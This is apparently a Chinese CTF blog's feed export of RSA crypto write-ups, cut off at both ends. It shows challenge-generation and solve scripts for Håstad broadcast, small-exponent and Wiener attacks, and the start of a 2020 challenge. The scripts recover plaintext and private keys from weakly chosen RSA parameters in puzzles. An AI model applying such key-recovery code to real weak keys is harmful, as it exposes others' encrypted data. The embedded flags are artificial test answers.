number">25824403380218842654152117237181863815407686057920357548100132783016208234216157331481187013858706620084532009147859360032194662194329147430352381352060599665383607132414222783152103706812942495504805443853663820643284400132519740763181995336671760074736189118849190911417412125673622718186682930944463719251663826122062414169185281402187745799450127860616811214434583738617470847946117017912241156196170781549212311773302997289690360334428053433645188479934679156573770259457673448241437007751122166255146634172359683608410225806629185780976706769275891277564054509652711969428966369382807140328871035548244913540169</span><span class="token punctuation">,</span> <span class="token number">27237916069051621208940446912652352983034283876768722877796629630339066194659652050347720419800886409125794947519574028544026594230991606608793723513349031053967598250588096756917851047427400805606694825815650771281434785207392911507124225263256982256339868047939184615897450178154018301408865653899046967323372600912627209194957697714349971037547547785817038582309482843956504640495722872808769284795831606211370129997371039857944461416328980185572754574947986464294124047090215456723501364524474569642506285260702179251484768225200095243277847312804129809104143492271538375785121251371642879445405237226218130294767</span><span class="token punctuation">,</span> <span class="token number">13761550682262178277138207445908812895938004012620351458812077456012342912081457948142730381037941264721223863482179216010551793547021574285408780459622610402725800322968427850107196669966179328339837806343597136218927944640487794959105652921590477743490006234776475206318254765423468761009179359533340573903819987444132938579714590504929528901380380034611797641640102025769022580055379262631658712636898183456153010636153333354330556615811465638688432337372481631547224635135648075131524783033767896216049834072882777559679890752875405582498757130694817571975439400501682753249614034942783158191876673449277964305873</span><span class="token punctuation">]</span>c<span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">10262571808823462518706222972617543597862568988621892788603169566061143066015712397590162941689759961146172690260488971865965270847230222579998032904557938430984766267711048364907947168116473908091952262274847901197798670702630932509348193160049011343984674456154980133706472252009228877741952811774717803218313244040775956381945077497379634101671865923305021804060521682939202170177994307021066512676052755208342422597702905467231418454913781792876325613132181844091995047630699929420681514255787561417787538399764114936771546416271603555435195286433694761222982635917086486380929164535357220194188751490847126159740</span><span class="token punctuation">,</span> <span class="token number">1873760069623225193188031460164577168629510321843511590851589581010158323091884037245625334264450576423497513703748949943402486554235195486945608003604913492410550727032646952732075387833483434157962823847945961417788077590746865603009614636801926695485643494439910816287002493987681839263137321312158281577409606512588038571503481880205375876372759847610515728629030784895468324627007475548811579324164095761843942789779697129082973879068202809855392853491223029896314818656151121278599338954208895547796950391203204627158727359612310869523861493123901912234283765154942764948742461112728821107134608346552771856775</span><span class="token punctuation">,</span> <span class="token number">2985895977894993412250356564280621188757701877004747248029655606908178453788442472530624315824217412687521627124641549636268771426175593603860596969406918746968428475480360839574070154578348252212233965555420185919910549233104881737429986120779245582625147836249604511991694099504498456423355415033891952572068957140136031237587821914297743550751703500164233251775829591163214908665505948671743637428615178406048668071123208829673815143306105215918457316827849469724561259085924020618664008688924504157202910867055508798021785392339533763892777711399815389010578953671416118696256122691527492893238690603105740871718</span><span class="token punctuation">,</span> <span class="token number">880226958648330570665826652923585021064905285913220564535802601268914731939998238851663053132946194395728683681709691206818341165883097568804208974913295560837751365921375933221025439628586836402981502674560586284377581275819082460923772292780487491196858992362166740159608419089452540222602172839570711702715638458570267373629408280794214751990345330692342439212475521544906222647038911039746667297765160642325197077286500302972512842670715220866427191331087678451078964988930072707946282911276517877581001397844626280393814317485128907214187598723285030652543787338988559227984102314239323999288888886062656553567</span><span class="token punctuation">,</span> <span class="token number">2009815427590067013904234705045801411676517862085803426907991060580056876965631979890272588810800230952582542504850877216565503823555945840629024122371840947339558621619080946766065959900677138148030357494710396126783369878070540451138925897438184723977799391715647904517833046633527545658064968373331747651285453005992951298693244135497529999014011663505125408546171884008627711191184419674138689402575260876247393334319284308455639799976027283117878360299913911527890869762030625362974305707352360014964055595635315501016094747111266795155708691399809263809612237731990725856751947329733607523318847566974421507377</span><span class="token punctuation">,</span> <span class="token number">5694700766209667533320463555578774304413921444532095100497641465531621818677278187178007777107102216001903166590706266461389108866563137126658591265596096815630888192401258893389043674230339983362206002697721033273220169349689433933228398864735569502059227668658884754437859192804614688078126017106973898338983058467903273433629800893427045854677794419302456422469488313296020469202479512874455184512957276727018667852597050339727765639174070344434646695283305954814336208535975320481890216924783115781802398152316171967550392347431746885369490458690822632544727994467024208594657404613355215378203965583472028051158</span><span class="token punctuation">,</span> <span class="token number">10292024155412613173825075050556970628998306804602106049394871162726180325842644363271001627039660982320232377250177866906798633433125147372046294230795160430975886694419367570376173140902999001496377201160021928316891425794054040646925354276987039659647583093660753953920769021487949471906220620446860851971969844544591399518592683848757784465531598787547279741438244737906014906621222662915117890417807671575763023265920422409800110274912550502682376498609611973173660997965660328963204286476887664127188442751055758474381180365051193094521479396706496869721757475497142256079170254820437945136475911435012491537989</span><span class="token punctuation">]</span>m<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>CRT<span class="token punctuation">(</span>n<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
          <category> RSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>低指加密攻击</title>
      <link href="/2023/01/14/%E4%BD%8E%E6%8C%87%E5%8A%A0%E5%AF%86%E6%94%BB%E5%87%BB/"/>
      <url>/2023/01/14/%E4%BD%8E%E6%8C%87%E5%8A%A0%E5%AF%86%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<p>加密指数指的是e，e一般选取65535，当e很小，可直接破解。</p><h3 id="出题脚本"><a href="#出题脚本" class="headerlink" title="出题脚本"></a>出题脚本</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> libnum<span class="token keyword">import</span> gmpy2<span class="token comment">#生成随机素数</span>p<span class="token operator">=</span>libnum<span class="token punctuation">.</span>generate_prime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>q<span class="token operator">=</span>libnum<span class="token punctuation">.</span>generate_prime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>e<span class="token operator">=</span><span class="token number">3</span>m<span class="token operator">=</span><span class="token string">"flag&#123;20d6e2da95dcc1fa5f5432a436c4be18&#125;"</span><span class="token comment">#字符串转数字</span>m<span class="token operator">=</span>libnum<span class="token punctuation">.</span>s2n<span class="token punctuation">(</span>m<span class="token punctuation">)</span>n<span class="token operator">=</span>p<span class="token operator">*</span>qphi_n<span class="token operator">=</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#求逆元</span>d<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi_n<span class="token punctuation">)</span>c<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"n="</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"e="</span><span class="token punctuation">,</span>e<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"c="</span><span class="token punctuation">,</span>c<span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnum<span class="token keyword">def</span> <span class="token function">de</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    k <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        mm <span class="token operator">=</span> c <span class="token operator">+</span> n<span class="token operator">*</span>k        result<span class="token punctuation">,</span> flag <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>mm<span class="token punctuation">,</span> e<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token boolean">True</span> <span class="token operator">==</span> flag<span class="token punctuation">:</span>            <span class="token keyword">return</span> result        k <span class="token operator">+=</span> <span class="token number">1</span>n<span class="token operator">=</span> <span class="token number">14067473525623615859223663589118945198091192669401088734569589535726733244095067264729942915265175903139441309376381225701454902095234966599914234681888481774607095853830772571665038109641511499155604914228117882196188074964226780922239011682486198651997912713999544628177959592818928976240251790858062449396082494272361535640237914373270152455829541596341184902017633404494979208958080467979235974182507427501682492000572071306960595992848840147393057648929439822116261337091431441205378542080755128597543738922210525692259529009107645032171097155449558362749512243918901171631681472217935131865121871798425854707759</span>e<span class="token operator">=</span> <span class="token number">3</span>c<span class="token operator">=</span> <span class="token number">2217344750798294937344050117513831761010547351781457575945714176628679412650463329423466955026804439931765627111856888102133234836914006818023839994342283023142702993182665344445325734299047409223354338948863171846780674244925724334091153701697864918695050507247415283070309</span>m<span class="token operator">=</span>de<span class="token punctuation">(</span>c<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
          <category> RSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wiener(维纳)攻击脚本（e的指数很大）</title>
      <link href="/2023/01/14/wiener-%E7%BB%B4%E7%BA%B3-%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC%EF%BC%88e%E7%9A%84%E6%8C%87%E6%95%B0%E5%BE%88%E5%A4%A7%EF%BC%89/"/>
      <url>/2023/01/14/wiener-%E7%BB%B4%E7%BA%B3-%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC%EF%BC%88e%E7%9A%84%E6%8C%87%E6%95%B0%E5%BE%88%E5%A4%A7%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="wiener-维纳-攻击脚本（e指数很大）"><a href="#wiener-维纳-攻击脚本（e指数很大）" class="headerlink" title="wiener(维纳)攻击脚本（e指数很大）"></a>wiener(维纳)攻击脚本（e指数很大）</h2><h3 id="1-给出一组n-e-c-n-x3D-p-q"><a href="#1-给出一组n-e-c-n-x3D-p-q" class="headerlink" title="1.给出一组n,e,c  n&#x3D;p*q"></a>1.给出一组n,e,c  n&#x3D;p*q</h3><h4 id="出题脚本："><a href="#出题脚本：" class="headerlink" title="出题脚本："></a>出题脚本：</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> libnum<span class="token keyword">import</span> random<span class="token keyword">import</span> gmpy2<span class="token comment">#生成随机素数</span>p<span class="token operator">=</span>libnum<span class="token punctuation">.</span>generate_prime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>q<span class="token operator">=</span>libnum<span class="token punctuation">.</span>generate_prime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>m<span class="token operator">=</span><span class="token string">"flag&#123;20d6e2da95dcc1fa5f5432a436c4be18&#125;"</span><span class="token comment">#字符串转数字</span>m<span class="token operator">=</span>libnum<span class="token punctuation">.</span>s2n<span class="token punctuation">(</span>m<span class="token punctuation">)</span>n<span class="token operator">=</span>p<span class="token operator">*</span>qphi_n<span class="token operator">=</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#计算d</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    nbits<span class="token operator">=</span><span class="token number">1024</span>    d <span class="token operator">=</span> random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span>nbits <span class="token operator">//</span> <span class="token number">4</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>d<span class="token punctuation">,</span> phi_n<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token keyword">and</span> <span class="token number">36</span> <span class="token operator">*</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">break</span><span class="token comment">#计算e</span>e <span class="token operator">=</span> libnum<span class="token punctuation">.</span>invmod<span class="token punctuation">(</span>d<span class="token punctuation">,</span>phi_n<span class="token punctuation">)</span>c<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"n="</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"e="</span><span class="token punctuation">,</span>e<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"c="</span><span class="token punctuation">,</span>c<span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="解密脚本："><a href="#解密脚本：" class="headerlink" title="解密脚本："></a>解密脚本：</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnum<span class="token keyword">def</span> <span class="token function">continuedFra</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""计算连分数    :param x: 分子    :param y: 分母    :return: 连分数列表    """</span>    cf <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">while</span> y<span class="token punctuation">:</span>        cf<span class="token punctuation">.</span>append<span class="token punctuation">(</span>x <span class="token operator">//</span> y<span class="token punctuation">)</span>        x<span class="token punctuation">,</span> y <span class="token operator">=</span> y<span class="token punctuation">,</span> x <span class="token operator">%</span> y    <span class="token keyword">return</span> cf<span class="token keyword">def</span> <span class="token function">gradualFra</span><span class="token punctuation">(</span>cf<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""计算传入列表最后的渐进分数    :param cf: 连分数列表    :return: 该列表最后的渐近分数    """</span>    numerator <span class="token operator">=</span> <span class="token number">0</span>    denominator <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> cf<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token comment"># 这里的渐进分数分子分母要分开</span>        numerator<span class="token punctuation">,</span> denominator <span class="token operator">=</span> denominator<span class="token punctuation">,</span> x <span class="token operator">*</span> denominator <span class="token operator">+</span> numerator    <span class="token keyword">return</span> numerator<span class="token punctuation">,</span> denominator<span class="token keyword">def</span> <span class="token function">solve_pq</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""使用韦达定理解出pq，x^2−(p+q)∗x+pq=0    :param a:x^2的系数    :param b:x的系数    :param c:pq    :return:p，q    """</span>    par <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>isqrt<span class="token punctuation">(</span>b <span class="token operator">*</span> b <span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">*</span> a <span class="token operator">*</span> c<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token operator">-</span>b <span class="token operator">+</span> par<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> a<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token operator">-</span>b <span class="token operator">-</span> par<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> a<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getGradualFra</span><span class="token punctuation">(</span>cf<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""计算列表所有的渐近分数    :param cf: 连分数列表    :return: 该列表所有的渐近分数    """</span>    gf <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>cf<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        gf<span class="token punctuation">.</span>append<span class="token punctuation">(</span>gradualFra<span class="token punctuation">(</span>cf<span class="token punctuation">[</span><span class="token punctuation">:</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> gf<span class="token keyword">def</span> <span class="token function">wienerAttack</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    :param e:    :param n:    :return: 私钥d    """</span>    cf <span class="token operator">=</span> continuedFra<span class="token punctuation">(</span>e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    gf <span class="token operator">=</span> getGradualFra<span class="token punctuation">(</span>cf<span class="token punctuation">)</span>    <span class="token keyword">for</span> d<span class="token punctuation">,</span> k <span class="token keyword">in</span> gf<span class="token punctuation">:</span>        <span class="token keyword">if</span> k <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span> <span class="token keyword">continue</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>e <span class="token operator">*</span> d <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> k <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        phi <span class="token operator">=</span> <span class="token punctuation">(</span>e <span class="token operator">*</span> d <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> k        p<span class="token punctuation">,</span> q <span class="token operator">=</span> solve_pq<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> n <span class="token operator">-</span> phi <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span>        <span class="token keyword">if</span> p <span class="token operator">*</span> q <span class="token operator">==</span> n<span class="token punctuation">:</span>            <span class="token keyword">return</span> dn<span class="token operator">=</span> <span class="token number">68781015120012754009149819243839432182753699533745468739333557116438115901358573880902197723852823949505376140916570536753019491036629572363854637530919546688901226752085109196549145599781909847664046508960094447692268230516763088293911965638780888720788954194778424857089535187609738198309161969913567107861</span>e<span class="token operator">=</span> <span class="token number">54093680529782962282616750547542407544796590039913570980901028264103594185617926725669901283009540557359666956131385125727959502505561517117179644650419753631214251337533961664493198676862110639584202010794500844074619335752668896589407110076134931918634061631574656816488381501901503924226166074238518619869</span>c<span class="token operator">=</span> <span class="token number">30443384983816710270001651296607959522389400057103143909277631290995899073895621701281106228069835965181342091582584186637031613250922961166298411359757600825556083868477673357860585539016515776933117915504873987178857740106223631465737111746470236003857656528610755145017342412306680097140732745012583119076</span>d<span class="token operator">=</span>wienerAttack<span class="token punctuation">(</span>e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>m<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-给出两组n-e-c-n-x3D-p-r-q-论文"><a href="#2-给出两组n-e-c-n-x3D-p-r-q-论文" class="headerlink" title="2.给出两组n,e,c   n&#x3D;p^r*q  论文"></a>2.给出两组n,e,c   n&#x3D;p^r*q  <a href="https://eprint.iacr.org/2015/399.pdf">论文</a></h3><h4 id="题目-羊城杯-2020-RRRRRRRSA"><a href="#题目-羊城杯-2020-RRRRRRRSA" class="headerlink" title="题目[羊城杯 2020]RRRRRRRSA"></a>题目[羊城杯 2020]RRRRRRRSA</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sympy<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>flag <span class="token operator">=</span> <span class="token string">'GWHT&#123;*********&#125;'</span>flag1 <span class="token operator">=</span> flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">]</span>flag2 <span class="token operator">=</span> flag<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token keyword">assert</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">27</span><span class="token punctuation">)</span>P1 <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1038</span><span class="token punctuation">)</span>P2 <span class="token operator">=</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>P1<span class="token punctuation">)</span><span class="token keyword">assert</span><span class="token punctuation">(</span>P2 <span class="token operator">-</span> P1 <span class="token operator">&lt;</span> <span class="token number">1000</span><span class="token punctuation">)</span>Q1 <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>Q2 <span class="token operator">=</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>Q1<span class="token punctuation">)</span>N1 <span class="token operator">=</span> P1 <span class="token operator">*</span> P1 <span class="token operator">*</span> Q1N2 <span class="token operator">=</span> P2 <span class="token operator">*</span> P2 <span class="token operator">*</span> Q2E1 <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>E2 <span class="token operator">=</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>E1<span class="token punctuation">)</span>m1 <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag1<span class="token punctuation">)</span>m2 <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag2<span class="token punctuation">)</span>c1 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m1<span class="token punctuation">,</span> E1<span class="token punctuation">,</span> N1<span class="token punctuation">)</span>c2 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m2<span class="token punctuation">,</span> E2<span class="token punctuation">,</span> N2<span class="token punctuation">)</span>output <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'secret'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>output<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'N1='</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>N1<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>output<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'c1='</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>c1<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>output<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'E1='</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>E1<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>output<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'N2='</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>N2<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>output<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'c2='</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>c2<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>output<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'E2='</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>E2<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>output<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnum<span class="token keyword">import</span> sympyN1<span class="token operator">=</span><span class="token number">28539239760609998188190348006307254423529984523926011298354682217538318221201323233400895681944936240127760319591714405028970789289069319799896668405374649890651532747231344681669678805558659075027847592497103008180667401328194026698749233856463858487096300279373254961880228864461848969277992345170787143090948199697266462389362914238819698112687026213976658417210663710975098053456243238943838516217798558036642447022751111845270483110159293737669560262193958772015914816987850140197853369767380678566336063010710812528919482513791382363881826680659095433918156094107350594201368395060384315773118343026193511099009931177740948978534045707679969732723167077325752299598557383348276880809860413060977442176372544771414690543709674125255716088409107695219200275948083389811120343</span>c1<span class="token operator">=</span><span class="token number">1432582014696304280729383293185554513436929310033823269133977593539672022744978340029313742941392672688363895524640351487464959860278576282854691764963077939567531721178912737755379413034164798305484717033762726637503348022397339246940965129765378824268519081645805470821347112369377592502109678876165836108257610182421452838639591697308432137885174692492190957254254995673010537260331832973067691597718100899475899017281060822990010249568584370589711942182283002241043038119931455622397903939297537776804134742442672001638774739818585840571993745726530468147630711418520486306194651956014117679528472239294239116641656014852458465706006398065574504399016286485027421474307531748266141136418468990741046806688381193860509615850629805172129297224123462801586090084637746562423808</span>E1<span class="token operator">=</span><span class="token number">165789626975534012040420057284463500775834911397214992496515507176272849770841998477139944440126985014248815418211585858658342524799286016374109756516450870298232454995876047057825952563581619963387275065218691863272435560584657400761485940130783607258311246708485662913432455714363728035174035069036312370233</span>N2<span class="token operator">=</span><span class="token number">28539239760609998188190348006307254423529984523926011298354682217538318221201323233400895681944936240127760319591714405028970789289069319799896668405377378062335966544017315329665365256524558696688888741558627244653037221467229159144343040629127843297021870442297090214085287305843208151069804261723045390513830069085816369993597001968164660390663983571269250460727348123970070188870297493687465127551913118724304293942732950040939150438510454614095673775735977217966562306548665616925803946575019193754095625773160561193234183507671760318885800972555685452762447998320093072265818485061557955267533908006243431570323359331106169234651310488306412479972526063665874847216797986275140105142694301359006633212114432527436809944525332728559649659936613255629968696993687582732203577</span>c2<span class="token operator">=</span><span class="token 